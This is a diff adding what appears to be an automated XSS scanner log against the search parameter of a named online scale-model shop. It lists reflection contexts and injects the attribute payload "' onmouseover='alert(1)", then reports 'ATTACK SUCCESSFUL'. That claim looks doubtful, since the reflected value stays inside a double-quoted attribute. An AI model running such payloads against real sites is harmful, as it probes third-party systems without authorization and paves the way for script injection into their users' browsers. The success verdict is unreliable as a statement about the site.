@@ -1,0 +1,46 @@
+https://www.constructionscalemodels.com/en/custom-decals
+
+GET Params:[1]
+['q']
+_______________________________________________________________________________________________________
+https://www.constructionscalemodels.com/en/search?q=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input class=search-text type=text id=q name=q value="(uvw&#34;xyz'yxz&lt;/zxy">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [2]
+<a href="/en/register?returnUrl=%2Fen%2Fsearch%3Fq%3D(uvw%2522xyz%27yxz%253C%2Fzxy" class=ico-register>
+<a href="/en/login?returnUrl=%2Fen%2Fsearch%3Fq%3D(uvw%2522xyz%27yxz%253C%2Fzxy" class=ico-login>
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.constructionscalemodels.com/en/search?q=' onmouseover='alert(1)
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input class=search-text type=text id=q name=q value="' onmouseover='alert(1)">
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
